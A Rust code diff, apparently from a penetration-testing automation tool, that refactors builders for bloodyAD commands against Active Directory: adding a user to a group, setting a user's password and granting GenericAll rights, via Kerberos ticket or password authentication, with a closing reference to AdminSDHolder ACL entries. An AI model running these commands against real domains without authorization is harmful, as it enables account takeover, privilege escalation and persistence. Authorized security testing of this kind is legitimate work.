@@ -22,6 +22,42 @@ fn domain_to_base_dn(domain: &str) -> String {
         .join(",")
 }
 
+/// Build a `bloodyAD` command with authentication already applied, ready for
+/// the caller to append the subcommand (`add groupMember …`, `set password …`,
+/// `add genericAll …`) and a timeout.
+///
+/// A non-empty `ticket_path` selects Kerberos ccache auth and takes precedence:
+/// the cross-forest credential resolver injects an inter-realm ccache that an
+/// NTLM bind would reject with 0x52e (Bug B). Otherwise falls back to a
+/// `username` + `password` NTLM bind.
+///
+/// bloodyAD's `-k` is variadic (`nargs='*'`) and takes keyword arguments like
+/// `ccache=<path>`; there is NO `-K` flag. Passing `-k -K <path>` made argparse
+/// consume `-K` as an unknown token and `<path>` landed in the subcommand slot,
+/// so bloodyAD rejected the whole call. `KRB5CCNAME`/`KRB5_CONFIG` are exported
+/// as a belt-and-braces fallback that recent bloodyAD versions read directly.
+fn bloodyad_base(args: &Value, domain: &str, dc_ip: &str) -> Result<CommandBuilder> {
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
+
+    let cmd = if let Some(tpath) = ticket_path {
+        let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
+        let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
+        CommandBuilder::new("bloodyAD")
+            .flag("-d", domain)
+            .flag("--host", dc_ip)
+            .arg("-k")
+            .arg(format!("ccache={tpath}"))
+            .env(ccname_key, ccname_val)
+            .env(cfg_key, cfg_val)
+    } else {
+        let username = required_str(args, "username")?;
+        let password = required_str(args, "password")?;
+        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
+        CommandBuilder::new("bloodyAD").args(creds)
+    };
+    Ok(cmd)
+}
+
 /// Add a user to a group via `bloodyAD add groupMember`.
 ///
 /// Required args: `domain`, `dc_ip`, `group`, `target_user`
@@ -44,41 +80,13 @@ pub fn build_bloodyad_add_group_member(args: &Value) -> Result<CommandBuilder> {
     let dc_ip = required_str(args, "dc_ip")?;
     let group = required_str(args, "group")?;
     let target_user = required_str(args, "target_user")?;
-    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
-    let cmd = if let Some(tpath) = ticket_path {
-        // bloodyAD's `-k` is variadic (`nargs='*'`). It accepts keyword
-        // arguments like `ccache=/path/x.ccache`; there is NO `-K` flag.
-        // Passing `-k -K <path>` made argparse consume `-K` as an unknown
-        // token, then `<path>` landed in the subcommand slot and bloodyAD
-        // rejected the entire call with "invalid choice: '<path>'". Use
-        // the documented `ccache=<path>` form and keep KRB5CCNAME as a
-        // belt-and-braces env fallback.
-        CommandBuilder::new("bloodyAD")
-            .flag("-d", domain)
-            .flag("--host", dc_ip)
-            .arg("-k")
-            .arg(format!("ccache={tpath}"))
-            .arg("add")
-            .arg("groupMember")
-            .arg(group)
-            .arg(target_user)
-            .env("KRB5CCNAME", tpath)
-            .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"))
-            .timeout_secs(60)
-    } else {
-        let username = required_str(args, "username")?;
-        let password = required_str(args, "password")?;
-        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-        CommandBuilder::new("bloodyAD")
-            .args(creds)
-            .arg("add")
-            .arg("groupMember")
-            .arg(group)
-            .arg(target_user)
-            .timeout_secs(60)
-    };
-    Ok(cmd)
+    Ok(bloodyad_base(args, domain, dc_ip)?
+        .arg("add")
+        .arg("groupMember")
+        .arg(group)
+        .arg(target_user)
+        .timeout_secs(60))
 }
 
 /// Set a user's password via `bloodyAD set password`.
@@ -101,39 +109,13 @@ pub fn build_bloodyad_set_password(args: &Value) -> Result<CommandBuilder> {
     let dc_ip = required_str(args, "dc_ip")?;
     let target_user = required_str(args, "target_user")?;
     let new_password = required_str(args, "new_password")?;
-    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
-    let cmd = if let Some(tpath) = ticket_path {
-        // Kerberos mode: `bloodyAD -d <d> --host <ip> -k ccache=<path> set …`.
-        // `-K` isn't a real bloodyAD flag — see comment in
-        // build_bloodyad_add_group_member. KRB5CCNAME env is set as a
-        // fallback; recent bloodyAD versions read it even when `ccache=`
-        // is provided.
-        CommandBuilder::new("bloodyAD")
-            .flag("-d", domain)
-            .flag("--host", dc_ip)
-            .arg("-k")
-            .arg(format!("ccache={tpath}"))
-            .arg("set")
-            .arg("password")
-            .arg(target_user)
-            .arg(new_password)
-            .env("KRB5CCNAME", tpath)
-            .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"))
-            .timeout_secs(60)
-    } else {
-        let username = required_str(args, "username")?;
-        let password = required_str(args, "password")?;
-        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-        CommandBuilder::new("bloodyAD")
-            .args(creds)
-            .arg("set")
-            .arg("password")
-            .arg(target_user)
-            .arg(new_password)
-            .timeout_secs(60)
-    };
-    Ok(cmd)
+    Ok(bloodyad_base(args, domain, dc_ip)?
+        .arg("set")
+        .arg("password")
+        .arg(target_user)
+        .arg(new_password)
+        .timeout_secs(60))
 }
 
 /// Grant GenericAll rights via `bloodyAD add genericAll`.
@@ -155,36 +137,13 @@ pub fn build_bloodyad_add_genericall(args: &Value) -> Result<CommandBuilder> {
     let dc_ip = required_str(args, "dc_ip")?;
     let target_dn = required_str(args, "target_dn")?;
     let principal = required_str(args, "principal")?;
-    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
-    let cmd = if let Some(tpath) = ticket_path {
-        // See build_bloodyad_add_group_member for why `-k ccache=<path>` and
-        // not `-k -K <path>`.
-        CommandBuilder::new("bloodyAD")
-            .flag("-d", domain)
-            .flag("--host", dc_ip)
-            .arg("-k")
-            .arg(format!("ccache={tpath}"))
-            .arg("add")
-            .arg("genericAll")
-            .arg(target_dn)
-            .arg(principal)
-            .env("KRB5CCNAME", tpath)
-            .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"))
-            .timeout_secs(60)
-    } else {
-        let username = required_str(args, "username")?;
-        let password = required_str(args, "password")?;
-        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-        CommandBuilder::new("bloodyAD")
-            .args(creds)
-            .arg("add")
-            .arg("genericAll")
-            .arg(target_dn)
-            .arg(principal)
-            .timeout_secs(60)
-    };
-    Ok(cmd)
+    Ok(bloodyad_base(args, domain, dc_ip)?
+        .arg("add")
+        .arg("genericAll")
+        .arg(target_dn)
+        .arg(principal)
+        .timeout_secs(60))
 }
 
 /// Add an ACL entry to the AdminSDHolder container via `bloodyAD add aclEntry`.
